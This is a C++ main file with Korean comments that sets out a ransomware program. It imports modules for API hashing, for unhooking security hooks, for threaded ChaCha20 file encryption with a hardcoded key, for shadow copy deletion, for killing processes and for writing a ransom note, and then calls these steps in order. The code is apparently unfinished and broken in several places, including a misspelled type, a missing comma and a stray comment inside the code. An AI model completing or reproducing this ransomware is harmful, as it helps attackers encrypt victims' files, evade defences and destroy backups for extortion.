#include <iostream>
#include <string>
#include <filesystem>
#include <psapi.h> // 경로처리
#include "ApiHasher.h" // 1. API 해싱
#include "unhooking.h" // 2. 언후킹
#include "WhiteList.h" // 3. 화이트리
#include "ThreadManager.h" // 4. 쓰레드 생성
#include "ShadowCopy.h" // 5. Shadowcopy 삭제
#include "Process_Kill.h" // 6. 프로세스 킬

#include "ChaCha20Cipher" // 7. ChaCha20 로직
#include "FileEncryptor" // 8. 파일 암,복호화
#include "KeyManager" // 키 하드코딩 해둔 곳
#include "NoteManager" // 9. 랜섬노트 생성




int WINAPI WinMain(
	HINSATANCE hInstance,
	HINSTANCE hPrevInstance
	LPSTR lCmdLine,
	int nShowCmd
)
{
	HMODULE hKernel = LoadLibraryA("kernel32.dll");
	if (!hKernel) {
		std::cout << "Failed to load kernel32.dll\n";
		return -1;
	}

	uint32_t hash_LoadLibraryA = Hash("LoadLibraryA");
	FARPROC addr = GetProcAddressByHash(hKernel, hash_LoadLibraryA);
	if (addr) {
		std::cout << "LoadLibraryA resolved by hash: 0x"
			<< std::hex << reinterpret_cast<uintptr_t>(addr) << std::dec << "\n";
	}
	else {
		std::cout << "Failed to resolve LoadLibraryA\n";
	}

	DWORD result = PerformUnhooking();
	//PerformUnhooking은 언후킹 실행 함수로 unhookingcpp에 구현되어잇음    
	if (result == 0) {
		continue
	}
	else {
		std::cout << "Fail PerformUnhooking()" << \n;
		//에러 발생시 예외 사항 적으면 될듯 
	}

	std::cout << "WhiteList Execution Start" << "\n";
	WhitelistManager wm;
	wm.InitializeDefault();
	// 정확하게 어떤 경로와 프로세스를 화이트리스트에 등록할지는 추가적으로 수정 필요
	wm.AddPath("C:\\Windows");
	wm.AddPath("C:\\Program Files");
	wm.AddProcess("svchost.exe");
	wm.AddProcess("explorer.exe");
	std::cout << "WhiteList Execution End" << "\n";



	// 쓰레드 생성 

	PoolManager manager;
	manager.CreatePools(2, 2, 2);

	manager.AddTask(LOCAL_POOL, L"file_local.txt");->이부분에 암호화할 파일들 넣으면 됩니다 !!
		manager.AddTask(NETWORK_POOL, L"file_network.txt");
	manager.AddTask(BACKUP_POOL, L"file_backup.txt");

	manager.WaitAll();
	manager.StopAll();

	FreeLibrary(hKernel);



	// ShadowCopy 삭제 구현 부분
	HRESULT hr = DeleteShadowCopy();
	if (hr == S_FALSE) {
		std::cout << "[+] There is not ShadowCopy...\n";
		return 0;
	}
	if (FAILED(hr)) {
		std::cout << "Delete ShadowCopy Failed...\n";
		std::cout << "Check Admin Privileges...\n";
		return 1;
	}
	std::cout << "Delete ShadowCopy Complete...\n";


	// Process Kill 구현 부분
	// 상세한 경로 설정은 추후에 추가
	// 지금은 그냥 예시입니다
	process_killer::ProcessKiller pk;
	pk.Initialize();
	pk.AddWhitelistPath("C:\\Windows");
	pk.AddWhitelistPath("C:\\Program Files");
	pk.AddWhitelistProcess("explorer.exe");
	pk.AddWhitelistProcess("svchost.exe");
	pk.BuildSafePidSet();
	pk.KillAll();



}



